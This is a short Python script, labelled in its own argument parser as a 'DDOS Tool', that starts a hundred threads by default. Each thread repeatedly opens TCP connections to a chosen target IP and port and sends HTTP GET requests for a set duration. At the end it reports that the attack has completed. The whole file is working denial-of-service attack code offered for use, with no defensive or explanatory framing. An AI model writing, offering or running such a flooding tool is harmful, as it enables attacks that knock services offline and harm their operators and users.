import socket
import threading
import time
import argparse

# Global variables for tracking packets sent
packets_sent = 0

# Function to send packets
def send_packets(target_ip, target_port, packets_per_second, stop_event):
    global packets_sent
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            s.close()
            packets_sent += 1
            if packets_sent % 1000 == 0:
                print(f"Sent {packets_sent} packets")
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1 / packets_per_second)

# Function to parse command line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description='DDOS Tool')
    parser.add_argument('target', help='Target URL or IP address')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--threads', type=int, default=100, help='Number of threads (default: 100)')
    parser.add_argument('--packets', type=int, default=100000, help='Packets per second (default: 100000)')
    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds to run the attack (default: 60)')
    return parser.parse_args()

def main():
    args = parse_arguments()

    # Extract target IP and port
    target_ip = args.target
    target_port = args.port

    # Create a stop event to control the threads
    stop_event = threading.Event()

    # Create threads
    threads = []
    for _ in range(args.threads):
        thread = threading.Thread(target=send_packets, args=(target_ip, target_port, args.packets, stop_event))
        threads.append(thread)
        thread.start()

    # Wait for the specified duration
    time.sleep(args.duration)

    # Set the stop event to terminate the threads
    stop_event.set()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    print(f"Attack completed. Total packets sent: {packets_sent}")

if __name__ == '__main__':
    main()
